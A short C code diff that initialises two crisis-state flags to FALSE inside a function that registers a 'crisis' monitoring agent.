@@ -183,5 +183,7 @@ DWORD __stdcall PM_CrisisAgentInit(JSONObject elem)
 
 void PM_CrisisAgentRegister()
 {
+	network_crisis = FALSE;
+	system_crisis = FALSE;		
 	AM_MonitorRegister(L"crisis", PM_CRISISAGENT, NULL, (BYTE *)PM_CrisisAgentStartStop, (BYTE *)PM_CrisisAgentInit, NULL);
 }
